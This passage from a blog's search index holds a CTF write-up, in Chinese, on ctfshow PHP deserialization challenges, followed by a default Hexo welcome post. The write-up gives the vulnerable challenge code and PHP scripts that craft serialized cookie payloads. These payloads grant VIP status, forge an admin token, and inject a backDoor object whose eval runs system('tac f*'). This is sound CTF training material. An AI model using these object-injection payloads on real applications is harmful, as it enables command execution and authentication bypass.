   &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username=$_GET[&#x27;username&#x27;];</span><br><span class="line">$password=$_GET[&#x27;password&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($username) &amp;&amp; isset($password))&#123;</span><br><span class="line">    $user = unserialize($_COOKIE[&#x27;user&#x27;]);    </span><br><span class="line">    if($user-&gt;login($username,$password))&#123;</span><br><span class="line">        if($user-&gt;checkVip())&#123;</span><br><span class="line">            $user-&gt;vipOneKeyGetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;no vip,no flag&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>构造让isvip的值为true</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">   public $isVip;</span><br><span class="line">  public function __construct()&#123;</span><br><span class="line">   $this-&gt;isVip=true;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new ctfShowUser();</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure><h2 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h2><p>源代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line"></span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">    public $username=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $password=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $isVip=false;</span><br><span class="line"></span><br><span class="line">    public function checkVip()&#123;</span><br><span class="line">        return $this-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    public function login($u,$p)&#123;</span><br><span class="line">        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;</span><br><span class="line">    &#125;</span><br><span class="line">    public function vipOneKeyGetFlag()&#123;</span><br><span class="line">        if($this-&gt;isVip)&#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            if($this-&gt;username!==$this-&gt;password)&#123;</span><br><span class="line">                    echo &quot;your flag is &quot;.$flag;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;no vip, no flag&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username=$_GET[&#x27;username&#x27;];</span><br><span class="line">$password=$_GET[&#x27;password&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($username) &amp;&amp; isset($password))&#123;</span><br><span class="line">    $user = unserialize($_COOKIE[&#x27;user&#x27;]);    </span><br><span class="line">    if($user-&gt;login($username,$password))&#123;</span><br><span class="line">        if($user-&gt;checkVip())&#123;</span><br><span class="line">            $user-&gt;vipOneKeyGetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;no vip,no flag&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">   public $username;</span><br><span class="line">   public $isVip;</span><br><span class="line">  public function __construct()&#123;</span><br><span class="line">   $this-&gt;isVip=true;</span><br><span class="line">    $this-&gt;username=&#x27;aaa&#x27;;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new ctfShowUser();</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure><h2 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h2><p>源代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">    private $username=&#x27;xxxxxx&#x27;;</span><br><span class="line">    private $password=&#x27;xxxxxx&#x27;;</span><br><span class="line">    private $isVip=false;</span><br><span class="line">    private $class = &#x27;info&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;class=new info();</span><br><span class="line">    &#125;</span><br><span class="line">    public function login($u,$p)&#123;</span><br><span class="line">        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $this-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class info&#123;</span><br><span class="line">    private $user=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public function getInfo()&#123;</span><br><span class="line">        return $this-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class backDoor&#123;</span><br><span class="line">    private $code;</span><br><span class="line">    public function getInfo()&#123;</span><br><span class="line">        eval($this-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username=$_GET[&#x27;username&#x27;];</span><br><span class="line">$password=$_GET[&#x27;password&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($username) &amp;&amp; isset($password))&#123;</span><br><span class="line">    $user = unserialize($_COOKIE[&#x27;user&#x27;]);</span><br><span class="line">    $user-&gt;login($username,$password);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先观察ctfShowUser类，反序列化的时候会先实例化info这个类，接着再销毁的时候调用类中的getInfo方法；很显然调用的是类info中的getInfo方法，而我们需要调用类backDoor中的getInfo方法，因为其中含有eval可以命令执行。所以我们把本来调用的类改成backDoor，构造姿势：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">    private $class;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;class=new backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class backDoor&#123;</span><br><span class="line">    private $code=&#x27;system(&quot;tac f*&quot;);&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$b=new ctfShowUser();</span><br><span class="line">echo urlencode(serialize($b));</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h2><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line"></span><br><span class="line">class message&#123;</span><br><span class="line">    public $from;</span><br><span class="line">    public $msg;</span><br><span class="line">    public $to;</span><br><span class="line">    public $token=&#x27;user&#x27;;</span><br><span class="line">    public function __construct($f,$m,$t)&#123;</span><br><span class="line">        $this-&gt;from = $f;</span><br><span class="line">        $this-&gt;msg = $m;</span><br><span class="line">        $this-&gt;to = $t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_COOKIE[&#x27;msg&#x27;]))&#123;</span><br><span class="line">    $msg = unserialize(base64_decode($_COOKIE[&#x27;msg&#x27;]));</span><br><span class="line">    if($msg-&gt;token==&#x27;admin&#x27;)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在cookie中给msg传入message序列化后进行base64编码的值,只要把token值设置为admin就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class message&#123;</span><br><span class="line">    public $token=&#x27;admin&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo base64_encode(serialize(new message()));</span><br></pre></td></tr></table></figure><span id="more"></span><hr><p>If you like TeXt, don’t forget to give me a star. :star2:</p><p><a href="https://github.com/7562ajj/7562ajj.github.io"><img src="https://img.shields.io/github/stars/kitian616/jekyll-TeXt-theme.svg?label=Stars&style=social" alt="Star This Project"></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> TeXt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/11/24/hello-world/"/>
      <url>/2022/11/24/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
